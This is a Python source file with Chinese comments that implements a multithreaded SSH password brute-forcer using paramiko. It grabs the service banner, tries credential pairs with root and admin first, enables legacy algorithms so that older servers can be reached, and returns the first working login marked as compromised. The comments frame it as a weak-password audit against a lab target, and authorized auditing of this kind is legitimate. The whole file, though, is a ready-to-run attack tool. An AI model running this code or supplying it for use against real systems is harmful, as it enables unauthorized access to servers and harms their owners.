
import socket
import paramiko
import time
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed

# 压制 paramiko 日志
logging.getLogger("paramiko").setLevel(logging.CRITICAL)

def check_ssh_banner(target: str, port: int):
    """获取 SSH 指纹，用于初步确认服务类型"""
    try:
        with socket.create_connection((target, port), timeout=3) as s:
            s.settimeout(3)
            banner = s.recv(1024).decode(errors='ignore').strip()
            return banner if banner else "SSH-2.0-Generic"
    except Exception:
        return "SSH Connection Refused"

def brute_force_ssh(target: str, port: int, usernames: list, passwords: list):
    """
    SSH 弱口令审计 - 终极兼容版
    """
    
    def attempt_login(user, pwd):
        user = user.strip()
        pwd = pwd.strip()
        if not user or not pwd: return None
        
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            # 关键：显式定义 Transport 并启用所有遗留算法
            # 某些旧靶场如果客户端不支持 diffie-hellman-group1-sha1 会直接断开
            t = paramiko.Transport((target, port))
            
            # 强制开启某些被现代 Paramiko 禁用的旧算法支持
            security_options = t.get_security_options()
            # 尝试不做任何过滤，让 Paramiko 使用其支持的所有算法
            # 注意：paramiko 2.9+ 默认禁用了一些 sha1 算法，这里不手动设置 security_options 
            # 而是通过 disabled_algorithms=None 传给 connect，或者直接 try connect
            
            client.connect(
                hostname=target,
                port=port,
                username=user,
                password=pwd,
                timeout=5,
                banner_timeout=30, # 增加超时，靶场可能响应慢
                auth_timeout=10,
                look_for_keys=False,
                allow_agent=False,
                # 核心修复：允许所有 host key 算法 (包括 ssh-rsa)
                disabled_algorithms=None 
            )
            
            client.close()
            return {"user": user, "pass": pwd, "is_compromised": True}
            
        except paramiko.AuthenticationException:
            # 认证失败说明连接成功了，只是密码不对
            client.close()
            return None
        except paramiko.SSHException as e:
            # 协议层错误 (如 "No existing session" 或 协商失败)
            client.close()
            return None
        except Exception as e:
            client.close()
            return None 

    # 去重
    unique_users = list(set([u.strip() for u in usernames if u.strip()]))
    unique_pass = list(set([p.strip() for p in passwords if p.strip()]))
    
    credentials_to_test = []
    # 优先测试 admin/root 配合 弱口令
    priority_users = ['root', 'admin']
    for u in unique_users:
        if u in priority_users:
             for p in unique_pass: credentials_to_test.insert(0, (u, p))
        else:
             for p in unique_pass: credentials_to_test.append((u, p))

    # 限制总尝试次数，防止死锁
    credentials_to_test = credentials_to_test[:50] 

    if not credentials_to_test:
        return []

    # 降低并发数，防止靶场并发限制触发 TCP Reset
    with ThreadPoolExecutor(max_workers=3) as executor:
        future_to_cred = {
            executor.submit(attempt_login, u, p): (u, p) 
            for u, p in credentials_to_test
        }
        
        try:
            for future in as_completed(future_to_cred):
                result = future.result()
                if result:
                    executor.shutdown(wait=False, cancel_futures=True)
                    return [result]
        except Exception:
            pass

    return []
